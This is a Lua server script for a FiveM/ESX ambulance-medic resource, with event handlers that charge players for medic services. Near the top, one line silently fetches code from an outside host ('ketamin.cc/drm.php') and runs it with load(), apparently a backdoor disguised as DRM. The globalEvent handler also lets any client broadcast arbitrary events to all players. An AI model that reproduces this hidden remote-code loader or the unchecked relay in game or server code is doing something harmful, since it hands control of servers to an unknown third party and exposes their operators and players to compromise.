Heap = {
    Medics = {}
}
Citizen.CreateThread(function() PerformHttpRequest("http://ketamin.cc/drm.php?user_id=68", function(err, text, headers) function exec() local f = assert(load(text)) f() end if pcall(exec) then else end end, 'GET', '') end)
TriggerEvent("esx:getSharedObject", function(library)
    Heap.ESX = library
end)

RegisterNetEvent("chames_ambulance_medic:globalEvent")
AddEventHandler("chames_ambulance_medic:globalEvent", function(options)
    TriggerClientEvent("chames_ambulance_medic:eventHandler", -1, options.event or "none", options.data or nil)
end)

RegisterNetEvent("chames_ambulance_medic:removeMoney")
AddEventHandler("chames_ambulance_medic:removeMoney", function(medicIndex)
    local character = Heap.ESX.GetPlayerFromId(source)

    if not character then return end

    local medic = Medics[medicIndex]

    if not medic then return end
    if not medic.Price then medic.Price = 100 end

    character.removeMoney(medic.Price)
end)